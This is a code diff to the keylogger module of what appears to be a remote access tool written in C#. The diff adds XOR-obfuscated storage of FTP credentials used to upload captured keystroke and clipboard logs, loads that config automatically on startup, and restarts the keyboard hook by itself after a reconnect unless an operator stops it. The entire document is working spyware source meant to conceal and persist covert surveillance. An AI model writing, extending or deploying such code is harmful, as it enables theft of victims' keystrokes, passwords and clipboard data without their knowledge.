@@ -47,6 +47,9 @@ internal static class KeyloggerFeature
     private static readonly string _logDir =
         Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                      Config.PersistName, "kl");
+    private static readonly string _ftpCfgPath = Path.Combine(_logDir, "ftp.dat");
+    private static readonly byte[] _ftpXorKey  = { 0x4B, 0x37, 0xA9, 0x2C, 0x81, 0xF5, 0x6D, 0x1E,
+                                                    0xC0, 0x58, 0x93, 0x2F, 0x74, 0xBA, 0x0D, 0x66 };
 
     private static string TodayFile =>
         Path.Combine(_logDir, DateTime.UtcNow.ToString("yyyy-MM-dd") + ".txt");
@@ -58,6 +61,7 @@ internal static class KeyloggerFeature
     {
         _flushTimer.Elapsed += (_, _) => FlushToDisk();
         _clipTimer.Elapsed  += (_, _) => PollClipboard();
+        LoadFtpConfig();
     }
 
     private static void FlushToDisk()
@@ -105,10 +109,21 @@ internal static class KeyloggerFeature
     private static string   _lastClip         = string.Empty;
     private static Func<string, string, string, int, Task>? _ftpStatusCb;
     private static readonly System.Timers.Timer _clipTimer = new(500) { AutoReset = true };
+    // Set on disconnect-flush so the next connect auto-restarts the hook thread.
+    // Cleared when operator explicitly stops via KeyloggerStop packet.
+    private static volatile bool _restartOnConnect;
 
     // ── Public API ──────────────────────────────────────────────────────────
 
-    internal static bool IsRunning => _running;
+    internal static bool IsRunning        => _running;
+    internal static bool IsFtpConfigured  => !string.IsNullOrEmpty(_ftpHost);
+    internal static bool RestartOnConnect => _restartOnConnect;
+    internal static void ClearRestartOnConnect() => _restartOnConnect = false;
+
+    internal static void RefreshFtpCallback(Func<string, string, string, int, Task> cb)
+    {
+        if (IsFtpConfigured) _ftpStatusCb = cb;
+    }
 
     internal static void Start()
     {
@@ -120,9 +135,14 @@ internal static class KeyloggerFeature
         _thread.Start();
     }
 
-    internal static void Stop()
+    internal static void Stop(bool reconnecting = false)
     {
-        lock (_startLock) { if (!_running) return; _running = false; }
+        lock (_startLock)
+        {
+            _restartOnConnect = reconnecting && _running;
+            if (!_running) return;
+            _running = false;
+        }
         _flushTimer.Stop();
         _clipTimer.Stop();
         FlushToDisk();
@@ -214,6 +234,52 @@ internal static class KeyloggerFeature
             _clipTimer.Start();
         else
             _clipTimer.Stop();
+
+        SaveFtpConfig();
+    }
+
+    private static void SaveFtpConfig()
+    {
+        try
+        {
+            var cfg = new KeyloggerFtpConfigStub
+            {
+                FtpHost          = _ftpHost ?? "",
+                FtpPort          = _ftpPort,
+                FtpUser          = _ftpUser ?? "",
+                FtpPass          = _ftpPass ?? "",
+                FtpPath          = _ftpPath ?? "/",
+                MaxSizeKb        = _maxSizeKb,
+                ClipboardEnabled = _clipboardEnabled
+            };
+            var json  = System.Text.Json.JsonSerializer.Serialize(cfg, SeroJson.Default.KeyloggerFtpConfigStub);
+            var bytes = Encoding.UTF8.GetBytes(json);
+            for (int i = 0; i < bytes.Length; i++) bytes[i] ^= _ftpXorKey[i % _ftpXorKey.Length];
+            Directory.CreateDirectory(_logDir);
+            File.WriteAllBytes(_ftpCfgPath, bytes);
+        }
+        catch { }
+    }
+
+    private static void LoadFtpConfig()
+    {
+        try
+        {
+            if (!File.Exists(_ftpCfgPath)) return;
+            var bytes = File.ReadAllBytes(_ftpCfgPath);
+            for (int i = 0; i < bytes.Length; i++) bytes[i] ^= _ftpXorKey[i % _ftpXorKey.Length];
+            var cfg = System.Text.Json.JsonSerializer.Deserialize(
+                Encoding.UTF8.GetString(bytes), SeroJson.Default.KeyloggerFtpConfigStub);
+            if (cfg == null || string.IsNullOrEmpty(cfg.FtpHost)) return;
+            _ftpHost          = cfg.FtpHost;
+            _ftpPort          = cfg.FtpPort;
+            _ftpUser          = cfg.FtpUser;
+            _ftpPass          = cfg.FtpPass;
+            _ftpPath          = string.IsNullOrEmpty(cfg.FtpPath) ? "/" : cfg.FtpPath;
+            _maxSizeKb        = cfg.MaxSizeKb;
+            _clipboardEnabled = cfg.ClipboardEnabled;
+        }
+        catch { }
     }
 
     private static void PollClipboard()
